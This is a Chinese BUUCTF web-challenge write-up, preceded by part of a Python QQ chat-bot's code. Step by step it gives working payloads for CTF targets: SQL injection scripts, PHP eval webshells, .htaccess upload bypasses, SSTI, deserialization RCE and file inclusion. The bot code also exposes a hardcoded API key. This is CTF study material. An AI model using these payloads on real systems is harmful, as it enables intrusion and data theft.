f\"好，我们不和[CQ:at,qq={uid}]玩\"\ndef unban(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    thisUser=thisGroupUserInfo[str(uid)]\n    thisUser['ban']=False\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"好吧，我原谅你了[CQ:at,qq={uid}]\"\ndef keywordForPerson(message, uid):\n    if message[0:2]=='天气':\n        person.sendMessage(weather(message),uid)\ndef isBan(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['ban']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef point(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        return f\"[CQ:at,qq={uid}]您的积分为{thisUser['point']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]请先签到后重试\"\ndef isAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n        if thisUser['admin']:\n            return True\n        else:\n            return False\n    except:\n        return False\ndef giveAdmin(gid,uid):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        thisUser={\"nick\": \"nick\", \"point\": 0, \"signTime\": \"\", \"ban\": False}\n    thisUser['admin']=True\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return f\"没问题，以后我就听你的啦[CQ:at,qq={uid}]\"\ndef today(message):\n    try:\n        message=message.split(' ')\n        message=message[1]\n    except:\n        message=None\n        return f\"请输入运势 星座来查询今日运势\"\n    if len(message)==2:\n        message=message+\"座\"\n    url=\"http://web.juhe.cn:8080/constellation/getAll\"\n    params={\n        \"key\":\"4a11bbcbf089edaf14c2d9bdb80c2ec4\",\n        \"consName\":message,\n        \"type\":\"today\"\n    }\n    ys=requests.get(url=url,params=params).json()\n    return f\"{ys['name']}今日运势：\\n综合指数：{ys['all']}%\\n幸运色：{ys['color']}\\n健康指数：{ys['health']}%\\n爱情指数：{ys['love']}%\\n财运指数：{ys['money']}%\\n工作指数：{ys['work']}%\\n幸运数字：{ys['number']}\\n适配星座：{ys['QFriend']}\\n总结：{ys['summary']}\"\ndef minusPoint(gid,uid,point):\n    groupUserInfo=group.readGroupUserInfo()\n    thisGroupUserInfo=groupUserInfo[str(gid)]\n    try:\n        thisUser=thisGroupUserInfo[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]请先签到后重试\"\n    if thisUser['point']-point < 0:\n        return f\"[CQ:at,qq={uid}]您的积分不足\"\n    thisUser['point']-=point\n    thisGroupUserInfo[str(uid)]=thisUser\n    groupUserInfo[str(gid)]=thisGroupUserInfo\n    group.saveGroupUserInfo(groupUserInfo)\n    return \"OK\"\ndef throwBottle(uid,message):\n    try:\n        me=message.split(\" \",3)\n        send=me[1]\n        rec=me[2]\n        con=me[3]\n        with open('bottle.json','r') as f:\n            bottle = json.load(f)\n        nb={\n            \"QQ\":str(uid),\n            \"send\":send,\n            \"rec\":rec,\n            \"con\":con\n        }\n        bottle.append(nb)\n        with open('bottle.json','w') as f:\n            json.dump(bottle,f)\n        return f\"biu～～～瓶子被扔走啦，坐等被人打捞吧～～～\"\n    except:\n        return \"扔瓶子失败了，请检查内容格式是否为：\\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\"\ndef getBottle(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)      \n    with open('bottle.json','r') as f:\n        bottle = json.load(f)\n    num=random.randint(0,len(bottle)-1)\n    nb=bottle[num]\n    bottle.remove(nb)\n    try:\n        myBottles[str(uid)].append(nb)\n    except:\n        myBottles[str(uid)]=[nb]\n    with open('bottle.json','w') as f:\n        json.dump(bottle,f)\n    with open('myBottles.json','w') as f:\n        json.dump(myBottles,f)\n    return f\"{nb['send']}扔给了{nb['rec']}一个瓶子，内容是：{nb['con']}\"\ndef myBottles(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return \"您还没有瓶子呢，快去捞瓶子吧～～～\"\n    me=\"\"\n    for i in myBottles[str(uid)]:\n        me+=f\"{i['send']}扔给了{i['rec']}一个瓶子，内容是：{i['con']}\\n\"\n    return f\"[CQ:at,qq={uid}]您的瓶子有：\\n{me}\"\ndef cleanBottles(message,uid):\n    num=message.split(\" \")[1]\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]您还没有瓶子呢，快去捞瓶子吧～～～\"\n    try:\n        nb=myBottles[str(uid)].pop(int(num)-1)\n        with open('myBottles.json','w') as f:\n            json.dump(myBottles,f)\n        return f\"[CQ:at,qq={uid}]您摔碎了{nb['send']}扔给{nb['rec']}一个瓶子，内容是：{nb['con']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]您还没有这个瓶子，快去捞一个吧\"\n\n\ndef keywordForGroup(message, gid, uid,nick,role):\n    if isBan(gid,uid) and not isAdmin(gid,uid):\n        return\n    if message[0:2]=='天气':\n        group.sendMessage(weather(message),gid)\n    elif message[0:2]=='运势':\n        group.sendMessage(today(message),gid)\n    elif message==\"积分\":\n        group.sendMessage(point(gid,uid),gid)\n    elif message[0:4]==\"听他的话\" and uid==405454586:\n        group.sendMessage(giveAdmin(gid,getQQ(message)),gid)\n    elif message[0:3]=='ban' and isAdmin(gid,uid):\n        group.sendMessage(ban(gid,getQQ(message)),gid)\n    elif message[0:5]=='unban' and isAdmin(gid,uid):\n        group.sendMessage(unban(gid,getQQ(message)),gid)\n    elif message=='/help':\n        group.sendMessage(help(),gid)\n    elif message[0:3]=='双色球':\n        group.sendMessage(theDoubleChromosphere(uid),gid)\n    elif message==\"签到\":\n        group.sendMessage(sign(gid,uid,nick),gid)\n    elif message==\"捞瓶子\":\n        group.sendMessage(getBottle(uid),gid)\n    elif message==\"我的瓶子\":\n        group.sendMessage(myBottles(uid),gid)\n    elif message[0:3]==\"摔瓶子\":\n        group.sendMessage(cleanBottles(message,uid),gid)\n    elif message==\"无内鬼\":\n        group.sendMessage(f\"[CQ:at,qq={uid}]穿件衣服吧你！你自己不恶sin吗？\",gid)\n    if re.search(r\"[\\(\\)（）]\",message):\n        group.sendMessage(buquan(message,uid),gid)\ndef keywordForPerson(message,uid):\n    if message[0:3]==\"扔瓶子\":\n        person.sendMessage(throwBottle(uid,message),uid)\n```\n\n```python\n#group.py\nimport json\nimport requests\n\n#保存用户信息\ndef saveGroupUserInfo(userInfo):\n    with open('userInfoOfGroup.json','w') as f:\n        json.dump(userInfo,f)\n#读取用户信息\ndef readGroupUserInfo():\n    with open('userInfoOfGroup.json','r') as f:\n        userInfo = json.load(f)\n    return userInfo\n#发送信息\ndef sendMessage(message,gid):\n    url=\"http://127.0.0.1:5700/send_msg?group_id=\"+str(gid)+\"&message=\"+message\n    requests.get(url)\n```\n\n","tags":["python"]},{"title":"BUUCTF记录1","url":"/posts/42117.html","content":"\nBUU第一份\n\n<!--more -->\n\n## [极客大挑战 2019]HardSQL\n\n首先尝试输入点东西\n\n结果![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13 22.14.07.png)\n\n尝试万能密码![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13 22.14.34.png)\n\n跑一下看看都过滤了啥\n\n```\n该字符是非法字符: union\n该字符是非法字符: and\n该字符是非法字符: sleep\n该字符是非法字符: by\n该字符是非法字符: if\n该字符是非法字符: char\n该字符是非法字符: ascii\n该字符是非法字符: mid\n该字符是非法字符: substring\n该字符是非法字符: handler\n该字符是非法字符: benchmark\n该字符是非法字符: insert\n该字符是非法字符: *\n该字符是非法字符: =\n该字符是非法字符: \\\n该字符是非法字符: 空格\n```\n\n只能尝试报错注入了\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n1'or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n```\n\n报错注入限制长度，用right函数切割\n\n\n\n\n\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n布尔盲注\n\n```python\nimport requests\nurl=\"http://40a6cf54-8382-490a-8651-8324677bb273.node4.buuoj.cn:81/index.php\"\nflagchar=\"flag{-abcdef1234567890}\"\nfor i in range(1,50):\n    for j in flagchar:\n        data={\n            'id':f\"if(ascii(substr((select(flag)from(flag)),{i},1))={ord(j)},2,1)\"\n        }\n        tex=requests.post(url=url,data=data).text\n        if \"Do you want to be my girlfriend\" in tex:\n            print(j,end=\"\")\n            break\n```\n\n## [GXYCTF2019]BabyUpload\n\n首先尝试上传php文件，被过滤，尝试png图片，过滤，只能上传jpeg了，成功\n\n发现服务器是apache服务器，尝试上传.htaccess文件\n\n```\nAddType application/x-httpd-php .jpeg\n```\n\n成功![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 20.14.17.png)\n\n成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 20.18.24.png)\n\n蚁剑链接即可\n\n## [BUUCTF 2018]Online Tool\n\n上来两个函数escapeshellarg()和escapeshellcmd()\n\n```\nescapeshellarg()将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec(),system()执行运算符。\n```\n\n```\nescapeshellcmd()对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义。反斜线（\\）会在以下字符之前插入：&#;`|*?~<>^()[]{}$,\\x0A和\\xFF。'和\"仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%和!字符都会被空格代替。\n```\n\n两个函数使用的例子\n\n```\n原始输入 172.17.0.2' -v -d a=1\nescapeshellarg处理后 '172.17.0.2''' -v -d a=1'\nescapeshellcmd处理后 '172.17.0.2'\\'' -v -d a=1'\n```\n\n在本题中，使用的nmap有一个名为-oG的参数选项，可以将nmap的命令和执行结果写入文件\n\n```\npayload:?host=' <?php @eval($_POST[\"kkk\"]);?> -oG kkk.php '\n```\n\n传入后变为\n\n```\nnmap -T5 -sT -Pn --host-timeout 2 -F ''<?php @eval($_POST[\"kkk\"]);?> -oG kkk.php''\n```\n\n## [BJDCTF2020]The mystery of ip\n\nSSTI模版注入，以后学了在理解吧\n\n```\nX-Forwarded-For: {{system(\"cat /flag\")}}\n```\n\n\n\n## [RoarCTF 2019]Easy Calc\n\nPHP字符串解析漏洞，查看数据包访问calc.php\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 22.29.28.png)\n\n尝试传入scandir()扫描文件，发现WAF阻挡，将传入参数由num改为 num，php获取到的参数名称为num而WAF获取到 num，绕过WAF成功，扫描发现在根目录下有f1agg文件，使用file_get_content函数读取文件即可\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 22.35.38.png)\n\n\n\n## [网鼎杯 2018]Fakebook\n\n首先注册后进入，发现no疑似存在SQL注入，尝试union select被过滤，尝试union/**/select成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.17.59.png)\n\n爆出回显位置，以及似乎网页对数据库内容进行了反序列化，稍后再看，先进行SQL注入爆出内容\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.19.45.png)\n\n发现用户信息是被序列化后存储在数据库中的，下一步应当尝试查看源码进行反序列化了，访问robots.txt发现了网站源码，源码对用户传入的博客链接进行访问并渲染，直接将链接改为本地文件并渲染，得到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.30.53.png)\n\n## [GXYCTF2019]禁止套娃\n\n首先看robots.txt发现没有内容，扫目录扫出.git，猜测有源码泄露，使用gitHack得到index.php\n\n```php\n//index.php\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n\n```\n\n第一步过滤了所有伪协议，只能执行函数了，下一步查看正则，大佬的解释如下\n\n```\n(?R)是引用当前表达式，(?R)? 这里多一个?表示可以有引用，也可以没有。，引用一次正则则变成了[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\),可以迭代下去，那么它所匹配的就是print(echo(1))、a(b(c()));类似这种可以括号和字符组成的，这其实是无参数RCE比较典型的例子\n```\n\n最终我们就是要构造一个无参嵌套函数执行，首先尝试扫描文件，查看是否有flag文件存在\n\n知识点：localeconv函数返回一包含本地数字及货币格式信息的数组\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.15.48.png)\n\n通过这个函数第一项我们可以拿到.，进而可以使用scandir函数扫描目录文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.17.17.png)\n\n通过current取出第一位.，flag.php在倒数第二的位置，先使用array_reverse函数倒转排序，在使用next取第二位，使用hightlight_file读出文件\n\n```\npayload:?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.19.48.png)\n\n## [GWCTF 2019]我有一个数据库\n\n进去就告诉你数据库是空的，先扫个文件吧，发现有robots.txt和/phpmyadmin/，先看robots，提示去phpinfo.php，就是个phpinfo页面，也没啥提示，看phpmyadmin，数据库里还真没东西\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22 15.25.46.png)\n\n看WP，发现是一个关于phpmyadmin的远程文件包含漏洞[CVE-2018-12613](https://blog.csdn.net/qq_43579362/article/details/108476182)\n\n出现bug的代码位置：phpMyAdmin/index.php\n\n![](https://img-blog.csdnimg.cn/20200908202849454.png)\n\n可以看到传入的target需要满足的条件：\n\n1、是字符串\n\n2、没有index\n\n3、不`target_blacklist`中\n\n4、满足`Core`类中`checkPageValidity`函数检查\n\n最后一个条件的有关代码如下\n\n![](https://img-blog.csdnimg.cn/20200908203030418.png)\n\n上述函数可知，如果想要函数返回真，需要满足以下三个条件的任意一个\n\n1、`$page`变量值在`$white_list`数组中\n\n2、经过`mb_substr()`和`mb_strpos()`处理的`$page–>$_page`的变量值在`$_whitelist`数组中，\n\n3、经过`urldecode(),mb_substr(),mb_strpos()`处理的`$page–>$_page`的变量值在`$_whitelist`数组中，\n\n![](https://img-blog.csdnimg.cn/20200908204934607.png)\n\n开始构造payload，先挑一个在whitelist中的文件db_datadict.php然后加问号和我们想要包含的文件\n\n```\npayload:?target=db_datadict.php%253f/../../../../../../../../../flag\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22 15.45.08.png)\n\n## [网鼎杯 2020 朱雀组]phpweb\n\n打开网站查看源码，发现有一个延时5秒提交的参数，抓包查看参数名称发现可能是执行函数的东西，尝试highlight_file读取页面源码成功\n\n```php+HTML\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n过滤了大部分危险函数，继续看发现有一个Test类在销毁时会执行函数，可通过反序列化绕过函数禁用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23 00.33.29.png)\n\n尝试构造成功，但没有发现flag，搜索一下发现在/tmp/flagoefiu4r93\n\n```\npayload:\nPOST\nfunc=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"tac /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23 00.36.23.png)\n\n## [BSidesCF 2020]Had a bad day\n\n选猫猫或狗狗后url中出现注入点，尝试读取文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-25 23.42.45.png)\n\n似乎会自动补后缀，去掉.php，读取源码\n\n```php+HTML\n<?php\n\t$file = $_GET['category'];\n\tif(isset($file))\n\t{\n\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\"))\n    {\n\t\t\tinclude ($file . '.php');\n\t\t}\n\t\telse{\n\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n\t\t}\n\t}\n?>\n```\n\n包含的条件是参数中有woofers，meowers或者index，任选一个构造payload，再使用过滤器base64编码就可以\n\n```\npayload:?category=php://filter/convert.base64-encode/resource=index/../flag\n```\n\n## [BJDCTF2020]Mark loves cat\n\n啥也没有先扫吧，扫出.git，githack跑一下，看源码\n\n```PHP\n//index.php\n<?php\n\n$flag = file_get_contents('/flag');\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y){\n    $$x = $y;\n}\n\nforeach($_GET as $x => $y){\n    $$x = $$y;\n}\n\nforeach($_GET as $x => $y){\n    if($_GET['flag'] === $x && $x !== 'flag'){\n        exit($handsome);\n    }\n}\n\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\n    exit($yds);\n}\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\n    exit($is);\n}\n\necho \"the flag is: \".$flag;\n```\n\n用第二个判断，$yds=$flag即可\n\n```\npayload:?yds=flag\n```\n\n## [强网杯 2019]高明的黑客\n\n下载源码，3000个文件，打开看内容中有许多eval函数，但是执行时内容不一定可用，编写脚本进行测试\n\n```python\nimport os\nimport requests\nimport re\npath=\"C:\\phpstudy_pro\\WWW\\src\\\\\"\nfiles=os.listdir(path)\nprint(path)\nfor i in files:\n    try:\n        with open(path+i,'r') as f:\n            gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read()))\n            posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read()))\n    except:\n        continue\n    data={}\n    parm={}\n    for j in gets:\n        parm[j]=\"echo 'jlanhere';\"\n    for j in posts:\n        data[j] = \"echo 'jlanhere';\"\n    tex=requests.post(url=f\"http://src/{i}\",data=data,params=parm).text\n    if \"jlanhere\" in tex:\n        tp={}\n        for k in gets:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.get(url=f\"http://src/{i}\",params=tp).text\n            if \"jlanhere\" in textt:\n                print(\"get\")\n                print(i)\n                print(k)\n                exit()\n        for k in posts:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.post(url=f\"http://src/{i}\",data=tp).text\n            if \"jlanhere\" in textt:\n                print(\"post\")\n                print(i)\n                print(k)\n                exit()\n```\n\n找出一个注入点\n\n```\npayload:\nxk0SzyKwfzw.php?Efa5BVG=cat /flag\n```\n\n拿到flag\n\n## [安洵杯 2019]easy_web\n\n看看传参，img的内容是被hex编码后再用两次base64编码得到的，解码内容如下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-26 23.02.28.png)\n\n尝试将index.php编码传入，得到源码\n\n```php+html\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi～ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?>\n```\n\n直接看关键，md5强相等绕过\n\n```\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n或\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n然后就是命令绕过，使用反斜杠绕过cat\n\n```\npayload:?cmd=ca\\t /flag\nPOST:\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n## [BJDCTF2020]Cookie is so stable\n\n直接测试出SSTI，但是这个渲染框架不是flask的，灰溜溜去看wp，发现是php的twig渲染模版，直接在cookie处放payload即可\n\n```\npayload:\nCookie: user={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}}\n```\n\n## [WUSTCTF2020]朴实无华\n\nrobots.txt->fAke_f1agggg.php->fl4g.php\n\n```PHP\n<?php \nheader('Content-type:text/html;charset=utf-8'); \nerror_reporting(0); \nhighlight_file(__file__); \n\n\n//level 1 \nif (isset($_GET['num'])){ \n    $num = $_GET['num']; \n    if(intval($num) < 2020 && intval($num + 1) > 2021){ \n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\"; \n    }else{ \n        die(\"金钱解决不了穷人的本质问题\"); \n    } \n}else{ \n    die(\"去非洲吧\"); \n} \n//level 2 \nif (isset($_GET['md5'])){ \n   $md5=$_GET['md5']; \n   if ($md5==md5($md5)) \n       echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\"; \n   else \n       die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"); \n}else{ \n    die(\"去非洲吧\"); \n} \n\n//get flag \nif (isset($_GET['get_flag'])){ \n    $get_flag = $_GET['get_flag']; \n    if(!strstr($get_flag,\" \")){ \n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); \n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\"; \n        system($get_flag); \n    }else{ \n        die(\"快到非洲了\"); \n    } \n}else{ \n    die(\"去非洲吧\"); \n} \n?> \n```\n\n首先intval函数特性\n\n```\nintval('2e4')=2\nintval('2e4'+1)=20001\n因为在执行下面的命令时相当于先执行了int('2e4')=20000再加一\n所以第一个绕过num=2e4即可\n```\n\n第二个md5弱相等绕过\n\n```\n$md5=md5($md5)\n开头是0e并且md5后也是0e即可\n0e215962017\n```\n\n最后空格绕过和cat绕过\n\n```\npayload:fl4g.php?num=2e4&md5=0e215962017&get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n```\n\n## [护网杯 2018]easy_tornado\n\n进去三个文件\n\n```\n/flag.txt：flag in /fllllllllllllag\n/welcome.txt：render\n/hints.txt：md5(cookie_secret+md5(filename))\n```\n\n点击文件查看链接传参，很明显是文件名和对应的`md5(cookie_secret+md5(filename))`所以我们需要找到`cookie_secret`这一变量的值，再看welcome中有render，怀疑是SSTI，更改传参内容，出现error页面，测试SSTI成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28 22.29.11.png)\n\n在查找tornado获取环境变量在handler.settings中，直接构造\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28 22.31.47.png)\n\n在按照hints中内容构造hash即可\n\n```\npayload:file?filename=/fllllllllllllag&filehash=da1ca88f71d944d0819a420a222fc69c\n```\n\n## [MRCTF2020]你传你🐎呢\n\nApache解析漏洞\n\n```\n#.htaccess\n<FilesMatch \"shell.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n上传后蚁剑连接即可\n\n## [BJDCTF2020]ZJCTF，不过如此\n\n先看代码\n\n```php\n//index.php\n<?php\nerror_reporting(0);\n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"I have a dream\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        die(\"Not now!\");\n    }\n    include($file);  //next.php\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n构造先读取next.php中的内容\n\n```\n?file=php://filter/read=convert.base64-encode/resource=next.php&text=php://input\nPOST:\nI have a dream\n```\n\n```php\n//next.php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n\t@eval($_GET['cmd']);\n}\n\n```\n\n这时候要用一个正则的漏洞[Preg_Replace代码执行漏洞解析](https://www.cesafe.com/html/6999.html)\n\n构造出正则内容为\n\nre=\\S*（多次匹配非空字符）\n\nstr=${phpinfo()}\n\n测试成功\n\n进而使用getFlag函数执行命令\n\n```\npayload:next.php?\\S*={${getFlag()}}&cmd=system('cat /flag');\n```\n\n## [De1CTF 2019]SSRF Me\n\n上来就是代码\n\n```python\n#! /usr/bin/env python\n# #encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport 